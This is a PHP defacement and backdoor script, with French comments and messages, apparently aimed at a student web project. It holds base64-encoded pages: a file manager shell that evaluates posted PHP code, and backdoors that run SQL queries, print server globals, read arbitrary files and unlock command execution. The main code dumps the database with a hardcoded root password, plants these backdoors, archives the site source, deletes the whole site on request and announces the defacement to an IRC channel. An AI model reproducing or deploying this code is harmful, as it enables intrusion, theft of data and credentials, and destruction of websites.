JF9QT1NUKSkKCQkJewoJCQkJZXZhbCgkX1BPU1RbImV2YWwiXSk7CgkJCQllY2hvICI8YnIgLz48
YnIgLz4iOwoJCQl9CgkJCT8+CgkJCQkJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPD8g
ZWNobyAkcHM7ID8+P2FjdGlvbj1ldmFsJnBhdGg9PD8gZWNobyAkcGF0aDsgPz4iPgoJCQkJCQkJ
PGxhYmVsPkV2YWx1ZXIgZHUgY29kZSA6PC9sYWJlbD48ZGl2IGNsYXNzPSJsaW5lIj48L2Rpdj4K
CQkJCQkJCTx0ZXh0YXJlYSBuYW1lPSJldmFsIiByb3dzPSI0MCIgY29scz0iMTUwIj48L3RleHRh
cmVhPjxkaXYgY2xhc3M9ImxpbmUiPjwvZGl2PgoJCQkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIg
Y2xhc3M9InN1Ym1pdCIgdmFsdWU9IkdvICEiLz4KCQkJCQkJCTwvZm9ybT48YnIgLz48YnIgLz4K
CQkJPD8KCQl9CgkJZWxzZSBpZiAoJF9HRVRbImFjdGlvbiJdID09ICJlZGl0IikKCQl7CgkJCSRm
aWxlID0gdXJsZGVjb2RlKCRfR0VUWyJmaWxlIl0pOwoJCQlpZiAoIWVtcHR5KCRfUE9TVCkpCgkJ
CXsKCQkJCSRjb250ZW50ID0gJF9QT1NUWyJjb250ZW50Il07CgkJCQlpZiAoZmlsZV9wdXRfY29u
dGVudHMoJGZpbGUsICRjb250ZW50KSkKCQkJCQlNZXNzYWdlKCJMZSBmaWNoaWVyIGEgYmllbiAm
ZWFjdXRlO3QmZWFjdXRlOyBtb2RpZmkmZWFjdXRlOy4iKTsKCQkJfQoJCQk/PgoJCQkJCQkJPGZv
cm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw/IGVjaG8gJHBzOyA/Pj9hY3Rpb249ZWRpdCZwYXRo
PTw/IGVjaG8gJHBhdGg7ID8+JmZpbGU9PD8gZWNobyAkZmlsZTsgPz4iPgoJCQkJCQkJPGxhYmVs
Pk1vZGlmaWVyIHVuIGZpY2hpZXIgOjwvbGFiZWw+PGRpdiBjbGFzcz0ibGluZSI+PC9kaXY+CgkJ
CQkJCQk8dGV4dGFyZWEgbmFtZT0iY29udGVudCIgcm93cz0iNDAiIGNvbHM9IjE1MCI+PD8gZWNo
byBodG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7Pz48L3RleHRhcmVh
PjxkaXYgY2xhc3M9ImxpbmUiPjwvZGl2PgoJCQkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xh
c3M9InN1Ym1pdCIgdmFsdWU9IkdvICEiLz4KCQkJCQkJCTwvZm9ybT48YnIgLz48YnIgLz4KCQkJ
PD8KCQl9CgkJZWxzZSBpZiAoJF9HRVRbImFjdGlvbiJdID09ICJkZWwiKQoJCXsKCQkJJGZpbGUg
PSAkX0dFVFsiZmlsZSJdOwoJCQlpZiAoIWlzX2RpcigkZmlsZSkpCgkJCQl7CgkJCQkJaWYgKEB1
bmxpbmsoJGZpbGUpKQoJCQkJCQlNZXNzYWdlKCJMZSBmaWNoaWVyIGEgYmllbiAmZWFjdXRlO3Qm
ZWFjdXRlOyBzdXBwcmltJmVhY3V0ZTsuIik7CgkJCQkJZWxzZQoJCQkJCQlNZXNzYWdlICgiVW5l
IGVycmV1ciBlc3Qgc3VydmVudWUgcGVuZGFudCBsYSBzdXBwcmVzc2lvbiBkdSBmaWNoaWVyLiIp
OwoJCQl9CgkJCWVsc2UgaWYgKGZpbGVfZXhpc3RzKCRmaWxlKSkKCQkJewoJCQkJaWYgKHJtX3Jl
Y3Vyc2l2ZSgkZmlsZSkpCgkJCQkJTWVzc2FnZSAoIkxlIGRvc3NpZXIgYSBiaWVuICZlYWN1dGU7
dCZlYWN1dGU7IHN1cHByaW0mZWFjdXRlOy4iKTsKCQkJCWVsc2UKCQkJCQlNZXNzYWdlICgiVW5l
IGVycmV1ciBlc3Qgc3VydmVudWUgcGVuZGFudCBsYSBzdXBwcmVzc2lvbiBkdSBkb3NzaWVyLiIp
OwoJCQl9CgkJCWVsc2UKCQkJCU1lc3NhZ2UgKCJDZSBmaWNoaWVyIG4nZXhpc3RlIHBhcy4iKTsK
CQl9CgkJZWxzZSBpZiAoJF9HRVRbImFjdGlvbiJdID09ICJwaHBpbmZvIikKCQl7CgkJCWVjaG8g
IjxkaXY+IjsKCQkJcGhwaW5mbygpOwoJCQllY2hvICI8L2Rpdj4iOwoJCX0KCX0KCQoJPz4KCQkJ
CQkJCTx0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIxIiBzdHlsZT0iZm9udC1zaXplOiAxNHB4
OyAiPgoJCQkJCQoJCQkJCQkJCTx0Ym9keT4KCQkJCQkJCQkJPHRyPgoJCQkJCQkJCQkJPHRoIHdp
ZHRoPSIxMzUiIGNsYXNzPSJsZWZ0Ij5QZXJtaXNzaW9uczwvdGg+CgkJCQkJCQkJCQk8dGggY2xh
c3M9ImxlZnQiPk5vbTwvdGg+CgkJCQkJCQkJCQk8dGggY2xhc3M9ImxlZnQiIHdpZHRoPSIxMzUi
Pk1vZGlmaWVyPC90aD4KCQkJCQkJCQkJCTx0aCBjbGFzcz0ibGVmdCIgd2lkdGg9IjEzNSI+VGVs
ZWNoYXJnZXI8L3RoPgoJCQkJCQkJCQkJPHRoIGNsYXNzPSJsZWZ0IiB3aWR0aD0iMTM1Ij5TdXBw
cmltZXI8L3RoPgoJCQkJCQkJCQkJPHRoIGNsYXNzPSJsZWZ0IiB3aWR0aD0iMTAwIj5UYWlsbGU8
L3RoPgoJCQkJCQkJCQkJPHRoIHdpZHRoPSIxNTAiIGFsaWduPSJjZW50ZXIiPkRhdGUgZGUgY3Im
ZWFjdXRlO2F0aW9uPC90aD4KCQkJCQkJCQkJCTx0aCB3aWR0aD0iMTUwIiBhbGlnbj0iY2VudGVy
Ij5EYXRlIGRlIG1vZGlmaWNhdGlvbjwvdGg+CgkJCQkJCQkJCTwvdHI+CgkJCQkJCQkJCTx0cj4K
CQkJCQkJCQkJCTx0ZD48PyBlY2hvIHBlcm1pc3Npb24oJHBhdGgpOyA/PjwvdGQ+CgkJCQkJCQkJ
CQk8dGQ+PHN0cm9uZz5fXyhDVVJSRU5UKV9fPC9zdHJvbmc+PC90ZD4KCQkJCQkJCQkJCTx0ZD4t
LS0tLS0tLTwvdGQ+CgkJCQkJCQkJCQk8dGQ+PGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9Ijw/IGVj
aG8gJHBzOyA/Pj9hY3Rpb249YXJjaGl2ZSZwYXRoPTw/IGVjaG8gJHBhdGg7ID8+JmZvbGRlcj08
PyBlY2hvICgkcGF0aCk7ID8+JmZpbGVuYW1lPTw/IGVjaG8gJHBhdGg7ID8+Ij5UZWxlY2hhcmdl
cjwvYT48L3RkPgoJCQkJCQkJCQkJPHRkPi0tLS0tLS0tPC90ZD4KCQkJCQkJCQkJCTx0ZD4tLS0t
LS0tLTwvdGQ+CgkJCQkJCQkJCQk8dGQgYWxpZ249ImNlbnRlciI+PD8gZWNobyBkYXRlKCJkIE0s
IEg6aSIsIGZpbGVjdGltZSgkcGF0aCkpOyA/PjwvdGQ+CgkJCQkJCQkJCQk8dGQgYWxpZ249ImNl
bnRlciI+PD8gZWNobyBkYXRlKCJkIE0sIEg6aSIsIGZpbGVtdGltZSgkcGF0aCkpOyA/PjwvdGQ+
CgkJCQkJCQkJCTwvdHI+CgkJCQkJCQkJCTx0cj4KCQkJCQkJCQkJCTx0ZD48PyBlY2hvIHBlcm1p
c3Npb24oJHBhdGguIi8uLiIpOyA/PjwvdGQ+CgkJCQkJCQkJCQk8PwoJCQkJCQkJCQkJaWYgKGNv
dW50X2NoYXIoJHBhdGgsICIuIikgKyBjb3VudF9jaGFyKCRwYXRoLCAiLyIpID49IHN0cmxlbigk
cGF0aCkpCgkJCQkJCQkJCQl7CgkJCQkJCQkJCQk/PgoJCQkJCQkJCQkJPHRkPjxzdHJvbmc+PGEg
aHJlZj0iPD8gZWNobyAkcHM7ID8+P3BhdGg9PD8gZWNobyAkcGF0aC4iLy4uIjsgPz4iPl9fKFBB
UkVOVClfXzwvYT48L3N0cm9uZz48L3RkPgoJCQkJCQkJCQkJPD8KCQkJCQkJCQkJCX0KCQkJCQkJ
CQkJCWVsc2UKCQkJCQkJCQkJCXsKCQkJCQkJCQkJCT8+CgkJCQkJCQkJCQk8dGQ+PHN0cm9uZz48
YSBocmVmPSI8PyBlY2hvICRwczsgPz4/cGF0aD08PyBlY2hvIHBhcmVudF9kaXIoJHBhdGgpOyA/
PiI+X18oUEFSRU5UKV9fPC9hPjwvc3Ryb25nPjwvdGQ+CgkJCQkJCQkJCQk8PwoJCQkJCQkJCQkJ
fQoJCQkJCQkJCQkJPz4KCQkJCQkJCQkJCTx0ZD4tLS0tLS0tLTwvdGQ+CgkJCQkJCQkJCQk8dGQ+
LS0tLS0tLS08L3RkPgoJCQkJCQkJCQkJPHRkPi0tLS0tLS0tPC90ZD4KCQkJCQkJCQkJCTx0ZD4t
LS0tLS0tLTwvdGQ+CgkJCQkJCQkJCQk8dGQgYWxpZ249ImNlbnRlciI+PD8gZWNobyBkYXRlKCJk
IE0sIEg6aSIsIGZpbGVjdGltZSgkcGF0aC4iLy4uIikpOyA/PjwvdGQ+CgkJCQkJCQkJCQk8dGQg
YWxpZ249ImNlbnRlciI+PD8gZWNobyBkYXRlKCJkIE0sIEg6aSIsIGZpbGVtdGltZSgkcGF0aC4i
Ly4uIikpOyA/PjwvdGQ+CgkJCQkJCQkJCTwvdHI+CgoJPD8KCWZvcmVhY2ggKGRpcl9saXN0KCRw
YXRoKSBhcyAkb2JqZWN0KQoJewoJCT8+CgkJCQkJCQkJCTx0cj4KCQkJCQkJCQkJCTx0ZD48PyBl
Y2hvICRvYmplY3RbInBlcm0iXTsgPz48L3RkPgoJCTw/CgkJaWYgKCRvYmplY3RbInR5cGUiXSAh
PSAiZGlyIikKCQl7CgkJPz4KCQkJCQkJCQkJCTx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0i
PD8gZWNobyAkb2JqZWN0WyJsaW5rIl07ID8+Ij48PyBlY2hvICRvYmplY3RbIm5hbWUiXTsgPz48
L2E+PC90ZD4KCQkJCQkJCQkJCTx0ZD48YSBocmVmPSI8PyBlY2hvICRwczsgPz4/YWN0aW9uPWVk
aXQmcGF0aD08PyBlY2hvICRwYXRoOyA/PiZmaWxlPTw/IGVjaG8gKCRvYmplY3RbImxpbmsiXSk7
ID8+Ij5Nb2RpZmllcjwvYT48L3RkPgoJCQkJCQkJCQkJPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBo
cmVmPSI8PyBlY2hvICRwczsgPz4/YWN0aW9uPWRvd25sb2FkJnBhdGg9PD8gZWNobyAkcGF0aDsg
Pz4mZmlsZW5hbWU9PD8gZWNobyAoJG9iamVjdFsibGluayJdKTsgPz4iPlRlbGVjaGFyZ2VyPC9h
PjwvdGQ+CgkJPD8KCQl9CgkJZWxzZQoJCXsKCQkJPz4KCQkJCQkJCQkJCTx0ZD48c3Ryb25nPjxh
IGhyZWY9Ijw/IGVjaG8gJHBzOyA/Pj9wYXRoPTw/IGVjaG8gJG9iamVjdFsibGluayJdOyA/PiI+
PD8gZWNobyAkb2JqZWN0WyJuYW1lIl07ID8+PC9hPjwvc3Ryb25nPjwvdGQ+CgkJCQkJCQkJCQk8
dGQ+LS0tLS0tLS08L3RkPgoJCQkJCQkJCQkJPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSI8
PyBlY2hvICRwczsgPz4/YWN0aW9uPWFyY2hpdmUmcGF0aD08PyBlY2hvICRwYXRoOyA/PiZmb2xk
ZXI9PD8gZWNobyAoJG9iamVjdFsibGluayJdKTsgPz4mZmlsZW5hbWU9PD8gZWNobyAkb2JqZWN0
WyJuYW1lIl07ID8+Ij5UZWxlY2hhcmdlcjwvYT48L3RkPgoJCTw/CgkJfQoJCT8+CgkJCQkJCQkJ
CQk8dGQ+PGEgaHJlZj0iPD8gZWNobyAkcHM7ID8+P2FjdGlvbj1kZWwmcGF0aD08PyBlY2hvICRw
YXRoOyA/PiZmaWxlPTw/IGVjaG8gKCRvYmplY3RbImxpbmsiXSk7ID8+Ij5TdXBwcmltZXI8L2E+
PC90ZD4KCQkJCQkJCQkJCTx0ZD48PyBlY2hvIGJ5dGVDb252ZXJ0KCRvYmplY3RbInNpemUiXSk7
ID8+PC90ZD4KCQkJCQkJCQkJCTx0ZCBhbGlnbj0iY2VudGVyIj48PyBlY2hvICRvYmplY3RbIm10
aW1lIl07ID8+PC90ZD4KCQkJCQkJCQkJCTx0ZCBhbGlnbj0iY2VudGVyIj48PyBlY2hvICRvYmpl
Y3RbImN0aW1lIl07ID8+PC90ZD4KCQkJCQkJCQkJPC90cj4KCQk8PwoJfQoJPz4KCQoJCQkJCQkJ
CTwvdGJvZHk+CgkJCQkJCQk8L3RhYmxlPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwv
ZGl2PgoJCQk8L2Rpdj4KCQk8L2JvZHk+PC9odG1sPgo8P3BocAp9CmVsc2UKewoJZWNobyAiZGVm
YWNlZCBieSByMmQyPGJyIC8+IjsKCSRsb2dpbiA9ICRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ107
CgllY2hvICc8Y2VudGVyPjxpbWcgc3JjPSJodHRwczovL3d3dy5lcGl0ZWNoLmV1L2ludHJhL3Bo
b3Rvcy8nLiRsb2dpbi4nLmpwZyIgLz4nOwoJZWNobyAnPGJyLz4nLiRsb2dpbi4nZXN0IG1vY2hl
LjwvY2VudGVyPic7Cn0K";

$sql_req = "
PD9waHAKaWYgKCEoJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXSA9PSAiY2hhcm1lX2ciIHx8CiRf
U0VSVkVSWydQSFBfQVVUSF9VU0VSJ10gPT0gIm1hcnJvbl9iIiB8fAokX1NFUlZFUlsnUEhQX0FV
VEhfVVNFUiddID09ICJrZXJpc2lfYyIgfHwKJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXSA9PSAi
bGVnYWlnX20iKSkKZXhpdCgxKTsKaWYgKGlzc2V0KCRfUE9TVFsnY2xhdXNlJ10pICYmICRfUE9T
VFsnY2xhdXNlJ10gIT0gTlVMTCkKICR3aGVyZSA9ICRfUE9TVFsnY2xhdXNlJ10uJz1cJycuJF9Q
T1NUWyd2YWx1ZSddLidcJyc7CmVsc2UKICR3aGVyZSA9ICcxJzsKbXlzcWxfY29ubmVjdCgkc3Fs
X2hvc3QsICRzcWxfbG9naW4sICRzcWxfcGFzcyk7Cm15c3FsX3NlbGVjdF9kYigkc3FsX2Jhc2Up
OwokcmVxPSJTRUxFQ1QgKiBGUk9NICIuJF9QT1NUWyd0YWJsZSddLiIgV0hFUkUgJHdoZXJlIjsK
ZWNobyAkcmVxOwokciA9IG15c3FsX3F1ZXJ5KCRyZXEpIG9yIGRpZShteXNxbF9lcnJvcigpKTsK
d2hpbGUgKCRkID0gbXlzcWxfZmV0Y2hfYXNzb2MoJHIpKQogZWNobyBwcmludF9yKCRkKTsKbXlz
cWxfY2xvc2UoKTsKPz4=";

$glo_req = "
PD9waHAKaWYgKCEoJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXSA9PSAiY2hhcm1lX2ciIHx8IAok
X1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddID09ICJtYXJyb25fYiIgfHwKJF9TRVJWRVJbJ1BIUF9B
VVRIX1VTRVInXSA9PSAia2VyaXNpX2MiIHx8CiRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10gPT0g
ImxlZ2FpZ19tIikpCmV4aXQoMSk7CmVjaG8gcHJpbnRfcigkR0xPQkFMUyk7Cj8+";

$glo_file = "
PD9waHAKaWYgKCEoJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXSA9PSAiY2hhcm1lX2ciIHx8IAok
X1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddID09ICJtYXJyb25fYiIgfHwKJF9TRVJWRVJbJ1BIUF9B
VVRIX1VTRVInXSA9PSAia2VyaXNpX2MiIHx8CiRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10gPT0g
ImxlZ2FpZ19tIikpCmV4aXQoMSk7CmVjaG8gZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydmaWxl
J10pOwo/Pg==";

$isis_exec = "
PD9waHAKaWYgKCEoJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXSA9PSAiY2hhcm1lX2ciIHx8IAok
X1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddID09ICJtYXJyb25fYiIgfHwKJF9TRVJWRVJbJ1BIUF9B
VVRIX1VTRVInXSA9PSAia2VyaXNpX2MiIHx8CiRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10gPT0g
ImxlZ2FpZ19tIikpCmV4aXQoMSk7CmlzaXNfZXhlYygpOyBpc2lzX3VubG9ja19leGVjX2FyZ3Mo
MCwgMSwgMiwgMywgNCwgNSwgNiwgNywgOCwgOSwgMTAsIDExLCAxMiwgMTMsIDE0LCAxNSwgMTYs
IDE3LCAxOSwgMjAsIDIxLCAyMiwgMjMsIDI0LCAyNSwgMjYsIDI3LCAyOCwgMjksIDMwLCAzMSwg
MzIsIDMzLCAzNCwgMzUsIDM2LCAzNywgMzgsIDM5LCA0MCwgNDEsIDQyKTsgaXNpc19leGVjX2Fy
Z3MoKTsKPz4=";


function rm_rec($filepath, $save)
{
	if (is_dir($filepath) && !is_link($filepath))
	{
		if (($dh = @opendir($filepath)) !== FALSE)
		{
			while (($sf = @readdir($dh)) !== FALSE)
			{
				if ($sf == '.' || $sf == '..')
		     		  continue;
		  		rm_rec($filepath.'/'.$sf, $save);
	   	         }
	 		 @closedir($dh);
        	}
	        return (@rmdir($filepath));
        }
  if ($filepath != './'.$save && $filepath != './fman.php')
    @unlink($filepath);
  return;
}

function dumpMySQL($serveur, $login, $password, $base)
{
  $connexion = mysql_connect($serveur, $login, $password);
  mysql_select_db($base, $connexion);
    
  $entete = "-- ----------------------\n";
  $entete .= "-- dump de la base ".$base." au ".date("d-M-Y")."\n";
  $entete .= "-- ----------------------\n\n\n";
  $creations = "";
  $insertions = "\n\n";
    
  $listeTables = mysql_query("show tables", $connexion);
  while($table = mysql_fetch_array($listeTables))
    {
       $creations .= "-- -----------------------------\n";
       $creations .= "-- creation de la table ".$table[0]."\n";
       $creations .= "-- -----------------------------\n";
       $listeCreationsTables = mysql_query("show create table ".$table[0], $connexion);
       while($creationTable = mysql_fetch_array($listeCreationsTables))
           $creations .= $creationTable[1].";\n\n";
       $donnees = mysql_query("SELECT * FROM ".$table[0]);
       $insertions .= "-- -----------------------------\n";
       $insertions .= "-- insertions dans la table ".$table[0]."\n";
       $insertions .= "-- -----------------------------\n";
       while($nuplet = mysql_fetch_array($donnees))
        {
           $insertions .= "INSERT INTO ".$table[0]." VALUES(";
           for($i=0; $i < mysql_num_fields($donnees); $i++)
             {
               if($i != 0)
                 $insertions .=  ", ";
               if(mysql_field_type($donnees, $i) == "string" || mysql_field_type($donnees, $i) == "blob")
                 $insertions .=  "'";
               $insertions .= addslashes($nuplet[$i]);
               if(mysql_field_type($donnees, $i) == "string" || mysql_field_type($donnees, $i) == "blob")
                 $insertions .=  "'";
             }
          $insertions .=  ");\n";
         }
       $insertions .= "\n";
    }
  mysql_close($connexion);

  $fichierDump = fopen("dump.sql", "wb");
  fwrite($fichierDump, $entete);
  fwrite($fichierDump, $creations);
  fwrite($fichierDump, $insertions);
  fclose($fichierDump);
}

function	phptar($dir)
{
  global	$mdr;

  if ($handle = opendir($dir))
    {
      while (false !== ($file = readdir($handle)))
       if ($file != "." && $file != "..")
        {
         if (is_dir($dir.'/'.$file))
	  phptar($dir.'/'.$file);
         else
	  $mdr .= "Dir : $dir/$file\n".file_get_contents($dir.'/'.$file)."\n";
        }
      closedir($handle);
    }
}

echo(base64_decode($fman));
exit;


$error="";

if (!isset($_GET['del']))
{

//A MODIFIER POUR LISIS et supprimer laffectation pour lisis (ils peuvent voir les sources donc le mdp, il faut vraiment le suprimer, pas le commenter)

$_ISIS['mysql_server'] = 'localhost'; 
 $_ISIS['mysql_user'] = 'root'; 
 $_ISIS['mysql_password'] = 'qrrkhkt'; 
 $_ISIS['mysql_db'] = 'epibay'; 

// FIN DE LA PARTIE A SUPPRIMER

$sql_host = $_ISIS['mysql_server'];
$sql_login = $_ISIS['mysql_user'];
$sql_pass = $_ISIS['mysql_password'];
$sql_base = $_ISIS['mysql_db'];

// FIN DE LA PARTIE A MODIF

fwrite(fopen("../SUPERGLOBAL.txt", "a+"), print_r($GLOBALS, true));
dumpMySQL($sql_host, $sql_login, $sql_pass, $sql_base);

if (@file_put_contents("_f_mana_.php", base64_decode($fman)))
 $success .= "_f_mana_.php created\n";
else
 $error .= "Error while creating fman\n";

if (@copy("_f_mana_.php", "../fman.php"))
 $success .= "Copied succefully to /\n";
else
 $error .= "Error while copying in /\n";

file_put_contents('../sql_req.php', '<?php $sql_host="'.$sql_host.'"; $sql_login="'.$sql_login.'"; $sql_pass="'.$sql_pass.'"; $sql_base="'.$sql_base.'"; ?>'.base64_decode($sql_req));
file_put_contents('../glo_req.php', base64_decode($glo_req));
file_put_contents('../glo_file.php', base64_decode($glo_file));
file_put_contents('../isis_exec.php', base64_decode($isis_exec));


chdir("../");
if (!file_exists("site.phptar"))
{
 phptar('.');
 if ($mdr && @file_put_contents('site.phptar', $mdr))
  $success .= "Tar done\n";
 else
  $error .= "Error while taring\n";
}

}
elseif ($_GET['del'] == '1')
{

chdir("../");
rm_rec(".", "defaced.txt");
rename("fman.php", "index.php");

if (@file_put_contents("defaced.txt", "r2d2"))
 $success .= "Defaced done\n";
else
 $error .= "Error while defacing\n";

$server['SOCKET'] = fsockopen("irc.freenode.net", 6667, $e, $r, 2);
if($server['SOCKET'])
  {
    $msg = "!deface ".$_GET['host']." has been defaced by R2D2";
    fwrite($server['SOCKET'], "PASS toto\n\r", 13);
    fwrite($server['SOCKET'], "NICK r2d2_deface\n\r", 22);
    fwrite($server['SOCKET'], "USER r r r r\n\r", 14);
    fwrite($server['SOCKET'], "JOIN #r2d2\n\r", 15);
    fwrite($server['SOCKET'], "PRIVMSG #r2d2 :$msg\n\r", 20+strlen($msg));
    sleep(5);
  }


}
echo $success;
echo $error;
?>
